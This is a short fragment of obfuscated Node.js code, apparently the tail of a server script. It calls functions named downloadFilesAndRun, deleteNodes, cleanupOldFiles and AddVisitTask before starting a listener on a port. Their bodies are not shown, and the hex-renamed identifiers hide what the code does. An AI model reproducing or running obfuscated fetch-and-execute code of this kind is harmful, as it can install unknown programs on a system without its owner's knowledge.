_0x22f7de=_0x25ba87;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x242900){console[_0x22f7de(0x1e1)](_0x22f7de(0x1e4),_0x242900);}}startserver()[_0x25ba87(0x158)](_0x3bc5d2=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x3bc5d2);}),app['listen'](PORT,()=>console[_0x25ba87(0x20a)](_0x25ba87(0x196)+PORT+'!'));
